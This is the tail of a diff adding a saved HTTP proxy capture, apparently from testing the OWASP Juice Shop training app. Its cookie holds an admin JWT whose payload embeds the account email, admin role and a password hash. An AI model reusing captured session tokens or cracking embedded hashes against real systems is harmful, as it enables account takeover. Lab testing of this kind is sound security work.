+Cookie: io=3qNaihF-ht8eBRgpAAAa; language=en; cookieconsent_status=dismiss; continueCode=KQabVVENkBvjq9O2xgyoWrXb45wGnmTxdaL8m1pzYlPQKJMZ6D37neRqyn3x; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIxMC4xMS40NS4xMDYiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDIxLTA5LTI2IDEwOjA0OjExLjQ2MSArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDIxLTA5LTI2IDExOjI4OjE3LjYwMyArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE2MzI2NTU3NDgsImV4cCI6MTYzMjY3Mzc0OH0.UF04RMTg_E5JppM5zLjQ_LG1LOCmfv_YcBOW0gG1aJH5YzUY28lD4YFFLjsPFtmYF8PFCnx8SyORVeJOT2cM9Z4jM2_L-c5mBiQWxdV3j8DZu_WtsTWgOeLh9G5lmUxiw_YqSULioR1hoJ6gwbEYPZUiGgKbYVpwCRJ97kWABmw
+If-None-Match: W/"2fbf-ths2CjgUf6gz9BObFtZAEOVCr4c"
+
+]]></request>
+    <status>304</status>
+    <responselength>255</responselength>
+    <mimetype></mimetype>
+    <response base64="false"><![CDATA[HTTP/1.1 304 Not Modified
+Access-Control-Allow-Origin: *
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+Feature-Policy: payment 'self'
+ETag: W/"2fbf-ths2CjgUf6gz9BObFtZAEOVCr4c"
+Date: Sun, 26 Sep 2021 11:29:09 GMT
+Connection: close
+
+]]></response>
+    <comment></comment>
+  </item>
+</items>
